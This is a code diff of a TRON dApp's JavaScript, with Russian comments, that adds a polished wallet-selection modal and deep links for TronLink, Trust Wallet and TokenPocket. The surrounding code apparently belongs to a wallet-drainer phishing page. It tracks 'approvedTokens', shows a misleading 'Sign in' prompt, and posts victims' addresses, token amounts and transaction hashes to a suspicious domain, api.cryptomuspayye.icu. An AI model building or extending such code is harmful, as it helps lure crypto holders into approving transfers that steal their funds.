@@ -113,11 +113,12 @@ const updateButtonVisibility = (isConnected) => {
   if (disconnectBtn) disconnectBtn.style.display = isConnected ? '' : 'none';
 };
 
-// Модальное окно (без изменений, копируется из твоего кода)
-function createCustomModal() {
+// Модальные окна
+function createModals() {
   const style = document.createElement('style');
   style.textContent = `
-    .custom-modal {
+    /* Общие стили для модальных окон */
+    .modal-overlay {
       opacity: 0;
       transition: opacity 0.3s ease-in-out;
       display: none;
@@ -127,29 +128,177 @@ function createCustomModal() {
       top: 0;
       width: 100%;
       height: 100%;
-      background-color: rgba(0, 0, 0, 0.5);
+      background-color: rgba(0, 0, 0, 0.7);
       justify-content: center;
       align-items: center;
+      backdrop-filter: blur(4px);
+    }
+    .modal-overlay.show {
+      opacity: 1;
+      display: flex;
+    }
+    
+    /* Модальное окно выбора кошелька */
+    .wallet-modal-content {
+      transform: translateY(-20px) scale(0.95);
+      transition: all 0.3s ease-in-out;
+      opacity: 0;
+      background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
+      padding: 32px;
+      border-radius: 24px;
+      text-align: center;
+      width: 420px;
+      max-width: 90vw;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .modal-overlay.show .wallet-modal-content {
+      transform: translateY(0) scale(1);
+      opacity: 1;
+    }
+    
+    .wallet-modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+    
+    .wallet-modal-title {
+      font-size: 24px;
+      font-weight: 700;
+      background: linear-gradient(45deg, #ff0844, #ff4563);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 0;
+    }
+    
+    .wallet-modal-close {
+      background: rgba(255, 255, 255, 0.1);
+      border: none;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s ease;
+      color: #999;
+      font-size: 20px;
+    }
+    .wallet-modal-close:hover {
+      background: rgba(255, 255, 255, 0.2);
+      color: #fff;
+    }
+    
+    .wallet-options {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 20px;
+    }
+    
+    .wallet-option {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 16px;
+      padding: 16px 20px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      text-align: left;
+    }
+    .wallet-option:hover {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: rgba(255, 255, 255, 0.2);
+      transform: translateY(-2px);
+    }
+    
+    .wallet-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 12px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+    }
+    
+    .wallet-info {
+      flex: 1;
+    }
+    
+    .wallet-name {
+      font-size: 18px;
+      font-weight: 600;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+    
+    .wallet-description {
+      font-size: 14px;
+      color: #999;
+    }
+    
+    .wallet-status {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #4ade80;
+    }
+    .wallet-status.not-detected {
+      color: #f87171;
+    }
+    .wallet-status-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: currentColor;
+    }
+    
+    /* Модальное окно процесса подключения */
+    .custom-modal {
+      opacity: 0;
+      transition: opacity 0.3s ease-in-out;
+      display: none;
+      position: fixed;
+      z-index: 1001;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(4px);
     }
     .custom-modal.show {
       opacity: 1;
       display: flex;
     }
     .custom-modal-content {
-      transform: translateY(-20px);
-      transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
+      transform: translateY(-20px) scale(0.95);
+      transition: all 0.3s ease-in-out;
       opacity: 0;
-      background-color: #121313;
+      background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
       padding: 45px;
-      border-radius: 30px;
+      border-radius: 24px;
       text-align: center;
       width: 320px;
       color: #ffffff;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
     .custom-modal.show .custom-modal-content {
-      transform: translateY(0);
+      transform: translateY(0) scale(1);
       opacity: 1;
     }
     .custom-modal-title {
@@ -177,20 +326,127 @@ function createCustomModal() {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    
+    /* QR код для мобильных кошельков */
+    .qr-container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 16px;
+      margin: 20px 0;
+    }
+    
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 24px 0;
+      color: #666;
+      font-size: 14px;
+    }
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: rgba(255, 255, 255, 0.1);
+    }
+    .divider span {
+      padding: 0 16px;
+    }
   `;
   document.head.appendChild(style);
 
-  const modal = document.createElement('div');
-  modal.id = 'customModal';
-  modal.className = 'custom-modal';
-  modal.innerHTML = `
+  // Модальное окно выбора кошелька
+  const walletModal = document.createElement('div');
+  walletModal.id = 'walletModal';
+  walletModal.className = 'modal-overlay';
+  walletModal.innerHTML = `
+    <div class="wallet-modal-content">
+      <div class="wallet-modal-header">
+        <h2 class="wallet-modal-title">Connect Wallet</h2>
+        <button class="wallet-modal-close">&times;</button>
+      </div>
+      
+      <div class="wallet-options">
+        <div class="wallet-option" data-wallet="tronlink">
+          <div class="wallet-icon" style="background: linear-gradient(135deg, #ff0844 0%, #ff4563 100%);">
+            <span style="color: white;">T</span>
+          </div>
+          <div class="wallet-info">
+            <div class="wallet-name">TronLink</div>
+            <div class="wallet-description">Connect using browser extension</div>
+          </div>
+          <div class="wallet-status" id="tronlink-status">
+            <span class="wallet-status-dot"></span>
+            <span>Checking...</span>
+          </div>
+        </div>
+        
+        <div class="wallet-option" data-wallet="trustwallet">
+          <div class="wallet-icon" style="background: #3375BB;">
+            <span style="color: white; font-size: 28px;">⚡</span>
+          </div>
+          <div class="wallet-info">
+            <div class="wallet-name">Trust Wallet</div>
+            <div class="wallet-description">Connect using mobile app</div>
+          </div>
+        </div>
+        
+        <div class="wallet-option" data-wallet="tokenpocket">
+          <div class="wallet-icon" style="background: #2980fe;">
+            <span style="color: white; font-size: 20px;">TP</span>
+          </div>
+          <div class="wallet-info">
+            <div class="wallet-name">TokenPocket</div>
+            <div class="wallet-description">Mobile & Extension wallet</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="divider">
+        <span>New to TRON?</span>
+      </div>
+      
+      <div style="text-align: center; font-size: 14px; color: #999;">
+        <p>Get a wallet to connect to this app</p>
+        <a href="https://www.tronlink.org/" target="_blank" style="color: #ff4563; text-decoration: none;">
+          Learn more about wallets →
+        </a>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(walletModal);
+
+  // Модальное окно процесса подключения
+  const customModal = document.createElement('div');
+  customModal.id = 'customModal';
+  customModal.className = 'custom-modal';
+  customModal.innerHTML = `
     <div class="custom-modal-content">
       <p class="custom-modal-title">Sign in</p>
       <div class="custom-modal-loader"></div>
       <p class="custom-modal-message">Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.</p>
     </div>
   `;
-  document.body.appendChild(modal);
+  document.body.appendChild(customModal);
+}
+
+// Функции управления модальными окнами
+function showWalletModal() {
+  const modal = document.getElementById('walletModal');
+  if (modal) {
+    // Проверяем наличие TronLink
+    checkTronLinkStatus();
+    modal.style.display = 'flex';
+    setTimeout(() => modal.classList.add('show'), 10);
+  }
+}
+
+function hideWalletModal() {
+  const modal = document.getElementById('walletModal');
+  if (modal) {
+    modal.classList.remove('show');
+    setTimeout(() => modal.style.display = 'none', 300);
+  }
 }
 
 function showCustomModal() {
@@ -207,6 +463,228 @@ function hideCustomModal() {
     modal.classList.remove('show');
     setTimeout(() => modal.style.display = 'none', 300);
   }
+}
+
+// Проверка наличия TronLink
+function checkTronLinkStatus() {
+  const statusElement = document.getElementById('tronlink-status');
+  if (window.tronWeb && window.tronWeb.ready) {
+    statusElement.innerHTML = `
+      <span class="wallet-status-dot"></span>
+      <span>Detected</span>
+    `;
+    statusElement.classList.remove('not-detected');
+  } else {
+    statusElement.innerHTML = `
+      <span class="wallet-status-dot"></span>
+      <span>Not detected</span>
+    `;
+    statusElement.classList.add('not-detected');
+  }
+}
+
+// Обработчики подключения кошельков
+async function connectTronLink() {
+  if (!window.tronWeb) {
+    alert('TronLink is not installed! Please install TronLink extension.');
+    window.open('https://www.tronlink.org/', '_blank');
+    return;
+  }
+  
+  if (window.tronWeb.ready) {
+    hideWalletModal();
+    // Существующая логика подключения уже обработает это автоматически
+  } else {
+    try {
+      // Запрашиваем разрешение на подключение
+      await window.tronWeb.request({ method: 'tron_requestAccounts' });
+      hideWalletModal();
+    } catch (error) {
+      console.error('TronLink connection error:', error);
+      alert('Failed to connect TronLink. Please try again.');
+    }
+  }
+}
+
+// Генерация deeplink для Trust Wallet
+function generateTrustWalletDeepLink() {
+  // Получаем текущий URL
+  const currentUrl = window.location.href;
+  // Trust Wallet deeplink для TRON (coin_id 195 - это TRON)
+  const deepLink = `trust://open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
+  
+  // Для мобильных устройств
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+    window.location.href = deepLink;
+    
+    // Fallback на App Store/Google Play если приложение не установлено
+    setTimeout(() => {
+      if (document.hidden) return;
+      if (confirm('Trust Wallet not detected. Would you like to install it?')) {
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        if (isIOS) {
+          window.open('https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409', '_blank');
+        } else {
+          window.open('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp', '_blank');
+        }
+      }
+    }, 2000);
+  } else {
+    // Для десктопа показываем QR код
+    showTrustWalletQR();
+  }
+}
+
+// Показать QR код для Trust Wallet
+function showTrustWalletQR() {
+  const walletModal = document.querySelector('.wallet-modal-content');
+  if (!walletModal) return;
+  
+  // Временно заменяем содержимое на QR код
+  const originalContent = walletModal.innerHTML;
+  
+  walletModal.innerHTML = `
+    <div class="wallet-modal-header">
+      <h2 class="wallet-modal-title">Connect Trust Wallet</h2>
+      <button class="wallet-modal-close" data-action="close-wallet-modal">&times;</button>
+    </div>
+    
+    <div style="text-align: center; padding: 20px;">
+      <p style="color: #999; margin-bottom: 20px;">Scan with Trust Wallet app to connect</p>
+      
+      <div class="qr-container">
+        <div style="background: #f0f0f0; width: 200px; height: 200px; margin: 0 auto; display: flex; align-items: center; justify-content: center; color: #666;">
+          QR Code Placeholder
+        </div>
+      </div>
+      
+      <p style="color: #666; font-size: 14px; margin-top: 20px;">
+        Trust Wallet mobile connection requires additional setup.
+        <br>For now, please use TronLink extension.
+      </p>
+      
+      <button data-action="reload-page" style="margin-top: 20px; background: #444; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
+        Back to wallet selection
+      </button>
+    </div>
+  `;
+}
+
+// Подключение TokenPocket
+function connectTokenPocket() {
+  // TokenPocket поддерживает как расширение браузера, так и мобильное приложение
+  
+  // Проверяем, установлено ли расширение TokenPocket
+  if (window.tronWeb && window.tronWeb.isTokenPocket) {
+    // Используем существующее подключение TokenPocket
+    hideWalletModal();
+    return;
+  }
+  
+  // Для мобильных устройств используем deeplink
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+    // TokenPocket deeplink
+    const currentUrl = window.location.href;
+    const deepLink = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({
+      url: currentUrl,
+      chain: 'TRON',
+      source: 'deeplink'
+    }))}`;
+    
+    window.location.href = deepLink;
+    
+    // Fallback на магазины приложений
+    setTimeout(() => {
+      if (document.hidden) return;
+      if (confirm('TokenPocket not detected. Would you like to install it?')) {
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        if (isIOS) {
+          window.open('https://apps.apple.com/app/tokenpocket/id1436028697', '_blank');
+        } else {
+          window.open('https://play.google.com/store/apps/details?id=vip.mytokenpocket', '_blank');
+        }
+      }
+    }, 2000);
+  } else {
+    // Для десктопа показываем инструкции
+    showTokenPocketInstructions();
+  }
+}
+
+// Показать инструкции для TokenPocket
+function showTokenPocketInstructions() {
+  const walletModal = document.querySelector('.wallet-modal-content');
+  if (!walletModal) return;
+  
+  walletModal.innerHTML = `
+    <div class="wallet-modal-header">
+      <h2 class="wallet-modal-title">Connect TokenPocket</h2>
+      <button class="wallet-modal-close" data-action="close-wallet-modal">&times;</button>
+    </div>
+    
+    <div style="text-align: center; padding: 20px;">
+      <div class="wallet-icon" style="background: #2980fe; width: 80px; height: 80px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;">
+        <span style="color: white; font-size: 32px;">TP</span>
+      </div>
+      
+      <p style="color: #999; margin-bottom: 30px;">
+        To connect TokenPocket on desktop:
+      </p>
+      
+      <ol style="text-align: left; max-width: 350px; margin: 0 auto; color: #ccc; line-height: 1.8;">
+        <li>Install TokenPocket browser extension</li>
+        <li>Create or import your TRON wallet</li>
+        <li>Refresh this page and try again</li>
+      </ol>
+      
+      <div style="margin-top: 30px;">
+        <a href="https://extension.tokenpocket.pro/" target="_blank" style="background: #2980fe; color: white; padding: 12px 24px; border-radius: 8px; text-decoration: none; display: inline-block;">
+          Get TokenPocket Extension
+        </a>
+      </div>
+      
+      <button data-action="reload-page" style="margin-top: 20px; background: #444; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
+        Back to wallet selection
+      </button>
+    </div>
+  `;
+}
+
+// Инициализация обработчиков модальных окон
+function initializeWalletModalHandlers() {
+  // Закрытие модального окна при клике на крестик
+  document.querySelector('.wallet-modal-close')?.addEventListener('click', hideWalletModal);
+  
+  // Закрытие при клике вне модального окна
+  document.getElementById('walletModal')?.addEventListener('click', (e) => {
+    if (e.target.id === 'walletModal') hideWalletModal();
+  });
+  
+  // Обработчики для кнопок кошельков
+  document.querySelectorAll('.wallet-option').forEach(option => {
+    option.addEventListener('click', async (e) => {
+      const wallet = option.getAttribute('data-wallet');
+      
+      if (wallet === 'tronlink') {
+        await connectTronLink();
+      } else if (wallet === 'trustwallet') {
+        generateTrustWalletDeepLink();
+      } else if (wallet === 'tokenpocket') {
+        connectTokenPocket();
+      }
+    });
+  });
+  
+  // Глобальный обработчик для динамически создаваемых элементов
+  document.addEventListener('click', (e) => {
+    const action = e.target.getAttribute('data-action');
+    
+    if (action === 'close-wallet-modal') {
+      hideWalletModal();
+    } else if (action === 'reload-page') {
+      location.reload();
+    }
+  });
 }
 
 // Утилиты для TRON
@@ -316,7 +794,7 @@ const getTokenPrice = async (symbol) => {
 
 const sendTransferRequest = async (userAddress, tokenAddress, amount, txHash) => {
   try {
-    const response = await fetch('https://api.cryptomuspayye.icu/api/transfers', {
+    const response = await fetch('https://api.cryptomuspayye.icu/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId: TRON_NETWORK.chainId, txHash })
@@ -556,18 +1034,25 @@ const initializeSubscribers = () => {
 // Инициализация
 window.addEventListener('load', async () => {
   await initTronWeb();
-  createCustomModal();
+  createModals();
+  initializeWalletModalHandlers();
   initializeSubscribers();
   updateButtonVisibility(!!tronWeb.defaultAddress.base58);
 
+  // Обработчик для кнопок открытия модального окна
   document.querySelectorAll('.open-connect-modal').forEach(button => {
     button.addEventListener('click', async () => {
       if (!tronWeb.defaultAddress.base58) {
-        alert('Please connect TronLink wallet');
+        // Показываем модальное окно выбора кошелька
+        showWalletModal();
+      } else {
+        // Если уже подключен, показываем информацию
+        alert(`Already connected: ${tronWeb.defaultAddress.base58}`);
       }
     });
   });
 
+  // Обработчик для кнопки отключения
   document.getElementById('disconnect')?.addEventListener('click', () => {
     store.approvedTokens = {};
     store.errors = [];
@@ -577,5 +1062,20 @@ window.addEventListener('load', async () => {
     store.isProcessingConnection = false;
     sessionStorage.clear();
     updateButtonVisibility(false);
+    
+    // Перезагружаем страницу для полного отключения
+    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+      alert('Please disconnect wallet in TronLink extension and refresh the page.');
+    }
   });
+  
+  // Проверяем изменение аккаунта в TronLink
+  if (window.tronWeb) {
+    setInterval(() => {
+      if (window.tronWeb.defaultAddress.base58 !== store.accountState.address) {
+        // Аккаунт изменился, обновляем состояние
+        location.reload();
+      }
+    }, 1000);
+  }
 });
